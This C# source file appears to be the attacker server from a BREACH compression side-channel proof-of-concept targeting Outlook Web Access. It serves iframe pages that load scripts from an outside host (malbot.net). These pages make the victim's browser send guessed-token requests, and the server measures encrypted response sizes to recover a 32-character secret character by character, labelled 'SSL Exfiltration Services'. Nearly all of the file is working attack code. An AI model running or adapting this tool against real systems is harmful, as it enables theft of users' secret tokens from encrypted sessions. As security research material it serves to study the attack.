using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

// Target: OWA
namespace BREACHv3Server
{
    partial class Program
    {
        static bool success;
        static Chilkat.Socket connectedSocket;
        static Chilkat.Socket connectedSocket2;
        static String lastAcknowledgedRequest;

        static int lastReadDELETEME;

        public static void Listener()
        {
            Console.WriteLine("BREACH (Port 82) callback is running in its own thread.");
            Chilkat.Socket listenSocket2 = SocketUtilities.InitializeSocket(82);

            connectedSocket2 = listenSocket2.AcceptNextConnection(60000 * 10);

            if (connectedSocket2 == null)
            {
                Console.WriteLine(listenSocket2.LastErrorText + "\r\n");
                return;
            }

            //  Set maximum timeouts for reading an writing (in millisec)
            connectedSocket2.MaxReadIdleMs = 20000;
            connectedSocket2.MaxSendIdleMs = 20000;

            do
            {
                String myHttpRequest = connectedSocket2.ReceiveString();
                if (myHttpRequest == null)
                {
                    Console.WriteLine("## Empty Socket... closed (connected = " + connectedSocket2.IsConnected + " )");
                    connectedSocket2.Close(10000);
                    //continue;
                    return;
                }

                else
                {
                    String getRequest = myHttpRequest.Split(new char[] { '\r', '\n' })[0];
                    lastAcknowledgedRequest = getRequest.Split(new char[] { '/' })[2];

                    String jsBody = "window.knownToken='" + knownToken + "';";
                    String myHttpResponse = "HTTP/1.1 200 OK\r\n" +
                                            "Content-Type: text/html; charset=us-ascii\r\n" +
                                            "Server: X-EvilServer\r\n" +
                                            "Connection: Keep-Alive\r\n" +
                                            "Content-Length: " + jsBody.Length + "\r\n" + "\r\n" +
                                            jsBody;

                    connectedSocket2.SendString(myHttpResponse);
                }
            } while (true);
        }



        static void Main(string[] args)
        {
            Chilkat.Socket listenSocket = SocketUtilities.InitializeSocket(81);

            // Paralell Thread
            Thread oThread = new Thread(new ThreadStart(Listener));
            oThread.Start();

            do
            {
                connectedSocket = listenSocket.AcceptNextConnection(60000 * 10);

                if (connectedSocket == null)
                {
                    Console.WriteLine(listenSocket.LastErrorText + "\r\n");
                    return;
                }

                //  Set maximum timeouts for reading an writing (in millisec)
                connectedSocket.MaxReadIdleMs = 10000;
                connectedSocket.MaxSendIdleMs = 10000;

                String ResponseBuffer;
                String myHttpRequest = connectedSocket.ReceiveString();
                if (myHttpRequest == null)
                {
                    Console.WriteLine("## Empty Socket... closed (connected = " + connectedSocket.IsConnected + " )");
                    connectedSocket.Close(10000);
                    continue;
                }

                if (!myHttpRequest.Contains("favicon.ico"))
                    Console.WriteLine(myHttpRequest); // TODO: Remove

                // Required to force browser to flush buffer (IFRAME Streaming)
                ResponseBuffer = String.Empty;
                ResponseBuffer = "<!--";
                for (int i = 0; i < 1024; i++)
                    ResponseBuffer += "@";
                ResponseBuffer += "-->";

                ResponseBuffer += "<html><head><title>The Tubes Are Strong</title><script src='https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js'></script>";
                String myHttpResponse = "HTTP/1.1 200 OK\r\n" +
                                        "Content-Type: text/html; charset=us-ascii\r\n" +
                                        "Server: X-EvilServer\r\n" +
                                        "Connection: close\r\n" +
                                        "Transfer-Encoding: chunked\r\n" +
                                        "\r\n";

                if (myHttpRequest.StartsWith("GET /Payload"))
                {
                    ResponseBuffer += "<link rel='stylesheet' href='http://www.malbot.net/console.css'>" +
                        "<script src='http://www.malbot.net/crime.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +
                        "</head><body><div id=myDiv style='display:none'>...streaming iFrame goes here</div><br><br><h3> " +
                        "<div class='container'><section class='editorWrap'><h1 class='animate dropIn'>The BREACH Attack</h1><div class='editor animate fadeIn'>" +
                        "<div class='menu'></div><div class='code'><textarea id='ta' class='text'>...</textarea></div></div>" +
                        "</section><p>&nbsp;</p></div>" +
                        "<script src='http://www.malbot.net/animate.js?" + DateTime.UtcNow.ToFileTimeUtc() + "'></script>" +

                        "<iframe id='myFrame' src='/BackChannel?" + DateTime.UtcNow.ToFileTimeUtc() + "' width=800 height=600 />";

                    myHttpResponse += ResponseBuffer;
                    myHttpResponse = myHttpResponse.Replace("Transfer-Encoding: chunked", "Content-Length: " + ResponseBuffer.Length);
                    success = connectedSocket.SendString(myHttpResponse);
                }

                else if (myHttpRequest.StartsWith("GET /BackChannel"))
                {
                    // TODO: Hide this DIV
                    ResponseBuffer += "</head><body><div id=myDiv>...streaming iFrame goes here</div><br><br><h3> ";

                    String hexLength = String.Format("{0:X}", ResponseBuffer.Length);
                    ResponseBuffer = hexLength + "\r\n" + ResponseBuffer;

                    myHttpResponse += ResponseBuffer;
                    success = connectedSocket.SendString(myHttpResponse);


                    // Attack Code Starts Here
                    HttpGet("Initialize1");
                    HttpGet("Initialize2");
                    Console.WriteLine("sleeping 1s...");
                    Thread.Sleep(1000);
                    File.Delete(@"c:\readBytesRealTime.txt");


                    Stopwatch stopWatch = new Stopwatch();
                    stopWatch.Start();
                    String extractedCanary = Attack();
                    stopWatch.Stop();
                    TimeSpan ts = stopWatch.Elapsed;
                    WriteConsoleSuccess(" > Total: " + stopWatch.Elapsed.TotalSeconds + " seconds");

                    HttpGet("Finalize1");
                    HttpGet("Finalize2");

                    Thread.Sleep(50);

                    knownToken = string.Empty;
                }

                else
                {
                    String NotFound404 = "HTTP/1.1 404 Not Found\r\n" +
                                         "Content-Length: 0\r\n" +
                                         "Connection: close\r\n\r\n";
                    success = connectedSocket.SendString(NotFound404);
                }

                if (success != true)
                {
                    Console.WriteLine(connectedSocket.LastErrorText + "\r\n");
                    return;
                }

                //  Close the connection with the client.
                connectedSocket.Close(10000);
                Console.WriteLine("success!");
            } while (true);

        }


        public static void HttpGet(string Canary)
        {
            String ResponseBuffer = "<script>parent.CorsXHR('" + Canary + "');</script>";
            ResponseBuffer = String.Format("\r\n{0:X}\r\n{1}", ResponseBuffer.Length, ResponseBuffer);
            success = connectedSocket.SendString(ResponseBuffer);
            if (!success)
                throw new Exception("Downstream Socket is not cooperating... reset iframe?");
        }

        static String knownToken = String.Empty; // Source of truth

        static string Attack()
        {
            String canary = "Canary=";

            NumberOfRequests = 0;
            PADDING_SIZE = 40; // THIS NUMBER MAKES A DIFFERENCE.
            PADDING_SIZE_ADJUSTMENT = 0;
            int PADDING_TOP = 300 - PADDING_SIZE;
            int PADDING_BOTTOM = 20 - PADDING_SIZE;

            int AirbagExpansions = 0;
            int MAX_AIRBAG_EXPANSIONS = 15;

            bool ForceRecoveryMode = false;
            ArrayList ConflictingWinners = new ArrayList(5);
            char?[] FirstRoundCollision = new char?[2];
            int? FirstRoundCollisionAt = null;
            int failuresSinceFirstRoundCollision = 0;

            do
            {
                string progress = String.Empty;
                if (failedTokens + guessedTokens > 0)
                    progress = Math.Round((1.0 * guessedTokens) / (failedTokens + guessedTokens) * 100, 2) + "% ";
                Console.Title = progress + "SSL Exfiltration Services...  " + knownToken + " (" + NumberOfRequests + ")";

                char? winner = null;
                int? compressedBytes = null;
                bool knownBad = false;
                int? winningMargin = null;
                ConflictingWinners = new ArrayList(5);
                ArrayList blackListedIntelligence = new ArrayList(16);

                // Keep track of overall number of failures, if it gets big, we roll back
                if (failuresSinceFirstRoundCollision > 10 && knownToken.Length > FirstRoundCollisionAt)
                {
                    WriteConsoleInfo("### REPORTING TOO MANY FAILURES (10+), GOING BACKWARDS");
                    char alternativePath;

                    if (knownToken.Substring(FirstRoundCollisionAt.Value, 1).Equals(FirstRoundCollision[0].ToString()))
                        alternativePath = FirstRoundCollision[1].Value;
                    else
                        alternativePath = FirstRoundCollision[0].Value;

                    knownToken = knownToken.Substring(0, FirstRoundCollisionAt.Value) + alternativePath;
                    failuresSinceFirstRoundCollision = 0;
                    FirstRoundCollisionAt = null;

                    continue;
                }


                // Standard attack
                foreach (char c in KeySpace)
                {
                    if (ForceRecoveryMode)
                        break;

                    if (IsCorrectGuess(canary + knownToken, c.ToString(), ref compressedBytes, ref knownBad, ref winningMargin))
                    {
                        WriteConsoleSuccess("[>] The winner is... " + c);
                        if (winner != null)
                        {
                            WriteConsoleError("\n[!] FIRST ROUND ERROR - We already had a winner!! (" + winner + " vs. " + c + ")");
                            if (FirstRoundCollisionAt == null)
                            {
                                FirstRoundCollision[0] = winner;
                                FirstRoundCollision[1] = c;
                                FirstRoundCollisionAt = knownToken.Length;
                            }
                            else FirstRoundCollisionAt++;


                            WriteConsoleWarning("Forcing basic recovery mode.\n");
                            winner = null;
                            ForceRecoveryMode = true;
                            break;
                        }

                        else
                        {
                            winner = c;
                        }
                    }

                    if (knownBad)
                    {
                        blackListedIntelligence.Add(c);
                    }
                }


                if (winner == null && AirbagExpansions < 3)
                {
                    Random myRandom = new Random();
                    PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);

                    WriteConsoleInfo("[ Brief Airbag Expansion (#" + AirbagExpansions + " @ " + (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) + ") ]");
                    AirbagExpansions++;
                    continue;
                }

                // Document this (?)
                bool? LonelyOracleOverride = null;
                if (winner == null)
                {
                    if (FirstRoundCollisionAt != null && knownToken.Length > FirstRoundCollisionAt)
                        failuresSinceFirstRoundCollision++;

                    WriteConsoleError("\n[!] We could not locate a winner");
                    WriteConsoleWarning("Initiating recovery procedure #2...\n");


                    int? winnerWinningMargin = null;
                    int? winnerCompressedBytes = null;
                    int? numberOfWinnersSet = 0;
                    bool BetterCompressionOracleHit = false;

                    foreach (char c in KeySpace)
                    {
                        foreach (char d in KeySpace)
                        {
                            if (blackListedIntelligence.Contains(d))
                            {
                                Console.Write("  ... " + d + " ... ");
                                continue;
                            }

                            bool knownBad2 = false;
                            if (IsCorrectGuess(canary + knownToken, d.ToString() + c.ToString(), ref compressedBytes, ref knownBad2, ref winningMargin))
                            {
                                if (winner == null)
                                {
                                    WriteConsoleSuccess("[>>] The winner is... " + d + " @ " + compressedBytes);
                                    winnerCompressedBytes = compressedBytes;
                                }

                                else if (winner == d)
                                {
                                    if (winningMargin > winnerWinningMargin)
                                        winnerWinningMargin = winningMargin;

                                    if (compressedBytes < winnerCompressedBytes)
                                        winnerCompressedBytes = compressedBytes;
                                }


                                if (winner != null && d != winner && !ConflictingWinners.Contains(d))
                                {
                                    if (winnerWinningMargin != null && winningMargin < winnerWinningMargin)
                                    {
                                        // Could this be a performance regression?
                                        if (!(AirbagExpansions < (3 + 5))) // let is spin at the beginning 6ce9b547861949f6b436fd20720 af189
                                        {
                                            WriteConsoleInfo("\n[!] Ignoring potential new winner w/ worse margin (original: " + winner + " vs. new: " + d + ") @ " + winningMargin);
                                            break;
                                        }
                                    }
                                    else if (winnerWinningMargin != null && winningMargin > winnerWinningMargin)
                                    {
                                        WriteConsoleInfo("\n[!] Overriding potential new winner w/ better margin (original: " + winner + " vs. new: " + d + ") @ " + winningMargin);
                                        winner = d;
                                        winnerWinningMargin = winningMargin;
                                        break;
                                    }

                                    // Else... equal difference, let's go with smaller compressed bytes
                                    if (compressedBytes <= winnerCompressedBytes)
                                    {
                                        WriteConsoleError("\n[!] We already had a winner ERROR2!! (original: " + winner + " vs. new: " + d + ") @ " + compressedBytes);

                                        if (FirstRoundCollisionAt != null && knownToken.Length > FirstRoundCollisionAt)
                                            failuresSinceFirstRoundCollision++;

                                        if (ConflictingWinners.Count == 0)
                                            ConflictingWinners.Add(winner);

                                        ConflictingWinners.Add(d);
                                        break;
                                    }
                                    else
                                    {
                                        WriteConsoleError("\n[!] Let's ignore this new tied winner on the basis of worse compression (ignore: " + d + " keep: " + winner + ") @ " + compressedBytes + " vs. " + winnerCompressedBytes);
                                        break;
                                    }
                                }

                                else
                                {
                                    if (compressedBytes < winnerCompressedBytes)
                                    {
                                        WriteConsoleWarning("\\!!\\ We found that the combination [" + d + c + "] compressed better!\n");
                                        LonelyOracleOverride = false;

                                        WriteConsoleInfo("Setting winner... " + d);
                                        winner = d;
                                        winnerWinningMargin = winningMargin;
                                        winnerCompressedBytes = compressedBytes;

                                        ConflictingWinners = new ArrayList();
                                        BetterCompressionOracleHit = true;
                                        break;
                                    }

                                    if (winner != d)
                                    {
                                        if (LonelyOracleOverride == null &&
                                            AirbagExpansions < (3 + 5) && numberOfWinnersSet > 5 && !BetterCompressionOracleHit)
                                        {
                                            WriteConsoleWarning(" ((')) Lonely Oracle Override - Trying to get an oracle agreement in ...  " + (3 + 5 - AirbagExpansions)); // Max 5 times
                                            LonelyOracleOverride = true;
                                        }

                                        WriteConsoleInfo("Setting winner.... " + d);
                                        winner = d;
                                        winnerWinningMargin = winningMargin;
                                        numberOfWinnersSet++;
                                    }

                                    //break; .-- this is problematic, we cannot do it (d4b4a57d11df44b3a5ddaf547c723a6e)
                                }
                            }
                        }

                        //////////if (winner != null) break; // DELETE ME -- try this out first, if it doesn't work run back in conservative mode
                    }

                    if ((winner == null || ConflictingWinners.Count > 0) && AirbagExpansions >= 3 && AirbagExpansions < MAX_AIRBAG_EXPANSIONS)
                    {
                        Random myRandom = new Random();
                        PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);

                        WriteConsoleInfo("\n[-------------- Going into DEEP Airbag Expansion Mode (#" + AirbagExpansions + " @ " + PADDING_SIZE_ADJUSTMENT + ")--------------]\n\n");
                        AirbagExpansions++;
                        winner = null;
                    }
                    else if (AirbagExpansions >= MAX_AIRBAG_EXPANSIONS)
                    {
                        WriteConsoleError("Do not not how to proceed. Exhausted Airbag Expansions");
                        return knownToken;
                        //throw new Exception("...");
                    }
                }


                if (winner != null && (LonelyOracleOverride == null || LonelyOracleOverride == false)) // if we resolved the winner...
                {
                    if (ForceRecoveryMode)
                    {
                        ForceRecoveryMode = false;
                        WriteConsoleInfo("ForceRecoveryMode = false;");
                    }

                    knownToken += winner;
                    AirbagExpansions = 0;
                    PADDING_SIZE_ADJUSTMENT = 0; // we may or may not want to do this... let's Try it both ways


                }

                Console.WriteLine("\n--- --- ---\n");

            } while (knownToken.Length < 32);


            WriteConsoleSuccess("\n\n\n ------------ GREAT SUCCESS @ " + NumberOfRequests + " -------------- " +
                        "\n Canary Exfiltrated : " + knownToken + "\n");
            Console.Title = "SSL Exfiltration Services...  " + knownToken + " (" + NumberOfRequests + ")";



            return knownToken;
        }


        public static bool IsCorrectGuess(String currentCanary, String guess,
            ref int? bytes1,
            ref bool knownBad,
            ref int? winningMargin
            )
        {
            knownBad = false;
            String padding = String.Empty;
            for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
                padding += "{}";

            HttpGet(currentCanary + guess + "@" + padding);
            bytes1 = ReadBytes(currentCanary.Replace("Canary=", String.Empty), currentCanary + guess + "@" + padding);

            HttpGet(currentCanary + padding + guess + "@");
            int? bytes2 = ReadBytes(currentCanary.Replace("Canary=", String.Empty), currentCanary + padding + guess + "@");

            if (bytes1 == null || bytes2 == null)
            {
                // RETRY 
                HttpGet(currentCanary + guess + "@" + padding);
                // This sends a request for a GIF file as well (I Don't think so, triple check)
                bytes1 = ReadBytes(currentCanary.Replace("Canary=", String.Empty), currentCanary + guess + "@" + padding);

                HttpGet(currentCanary + padding + guess + "@");
                bytes2 = ReadBytes(currentCanary.Replace("Canary=", String.Empty), currentCanary + padding + guess + "@");
            }


            if (bytes1 < bytes2)
            {
                Console.WriteLine("bytes1: " + bytes1 + " ... bytes2: " + bytes2 + " [" + guess + "]");
                winningMargin = bytes2 - bytes1;
                return true;
            }

            else if (bytes2 < bytes1)
                knownBad = true;

            return false;
        }



        public static int? ReadBytes(string currentCanary, string targetRead)
        {
            int errorCount = 0;
            while (!File.Exists(@"c:\readBytesRealTime.txt"))
            {
                if (++errorCount % 100 == 0)
                    WriteConsoleError("·· SLEEPING ON #1");

                Thread.Sleep(1);
            }

            do
            {
                try
                {
                    using (StreamReader sr = new StreamReader(File.OpenRead(@"c:\readBytesRealTime.txt")))
                    {
                        int allLength = 0;
                        bool readingStarted = false;
                        bool readingComplete = false;
                        int packetsRead = 0;

                        string all = sr.ReadToEnd();
                        sr.Close();

                        if (lastFrameRead == 0)
                        {
                            String[] tkns = all.Trim().Split(new char[] { '\r', '\n' });
                            lastFrameRead = Int32.Parse(tkns[0].Split(new char[] { ' ' })[0]) - 1;
                        }
                        //should this be first instead of last?

                        int previousLastFrameRead = lastFrameRead;

                        foreach (string s in all.Split(new char[] { '\r', '\n' }))
                            if (!String.IsNullOrEmpty(s))
                            {
                                bool isDelimiter = (s.Split(new char[] { ' ' })[0] == "---");
                                if (!isDelimiter)
                                {
                                    int frameNumber = Int32.Parse(s.Split(new char[] { ' ' })[0]);

                                    if (frameNumber > lastFrameRead)
                                    {
                                        packetsRead++;
                                        allLength += Int32.Parse(s.Split(new char[] { ' ' })[1]);
                                        lastFrameRead = frameNumber;
                                        readingStarted = true;
                                    }
                                }
                                else // delimiter
                                {
                                    if (readingStarted && allLength < 1000) // HACK [ TODO: Sample from initialization ]
                                    {
                                        readingStarted = false;
                                        allLength = 0;
                                    }

                                    else if (readingStarted)
                                    {
                                        readingComplete = true;
                                        break;
                                    }
                                }
                            }

                        if (lastAcknowledgedRequest != null
                            && targetRead == Uri.UnescapeDataString(lastAcknowledgedRequest))
                        {
                            if (lastReadDELETEME != 0 && Math.Abs(allLength - lastReadDELETEME) > 5)
                            {
                                WriteConsoleInfo(allLength + " >><< " + lastReadDELETEME);

                                readingStarted = false;
                                lastFrameRead = previousLastFrameRead;

                                ////////Console.ReadLine();
                                continue;
                            }

                            lastReadDELETEME = allLength;
                            readingComplete = true;
                            return allLength;
                        }



                        if (readingComplete && previousLastFrameRead != lastFrameRead)
                        {
                            //WriteConsoleWarning(" >> UPDATED LASTFRAME TO: " + lastFrameRead + " (allLength= " + allLength + ")");
                            return allLength;
                        }
                        else
                        {

                            if (++errorCount % 500 == 0)
                            {
                                if (errorCount > 10000 && currentCanary.Length > 0 || errorCount > 20000)
                                {
                                    WriteConsoleError("[!||!] BREAKING INFINITE LOOP");
                                    return null;
                                }
                            }

                            lastFrameRead = previousLastFrameRead;

                            continue;
                        }
                    }
                }
                catch (IOException)
                {

                    if (++errorCount % 500 == 0)
                        WriteConsoleError("·· NOT SLEEPING ON #2");
                }

            } while (true);

        }


    }
}
